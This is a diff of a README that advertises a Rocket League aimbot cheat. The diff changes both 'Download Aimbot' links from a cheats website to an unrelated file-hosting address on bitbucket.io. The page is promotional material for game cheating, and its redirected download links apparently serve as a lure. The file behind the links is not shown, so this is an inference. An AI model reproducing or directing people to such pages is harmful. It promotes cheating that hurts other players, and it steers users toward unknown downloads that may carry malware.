@@ -4,7 +4,7 @@ Missing open nets? Botching aerials? Struggling to land that last-second goal? W
 
 No more whiffs. No more tilts. Just perfect shots and clean dubs.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/rocket-league/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload15.bitbucket.io)
 ---
 
 ## 🧠 What Is the Rocket League Aimbot?
@@ -13,7 +13,7 @@ The **Rocket League Aimbot** is a cheat utility that auto-aligns your vehicle fo
 
 Whether you're shooting from midfield or flying in for a double tap, this tool has your back.
 
-[![Download Aimbot](https://i.ytimg.com/vi/RDDUSItdtZg/hqdefault.jpg)](https://wecheaters.github.io/cheats/rocket-league/)
+[![Download Aimbot](https://i.ytimg.com/vi/RDDUSItdtZg/hqdefault.jpg)](https://fileoffload15.bitbucket.io)
 ---
 
 ## 🔥 Key Aimbot Features
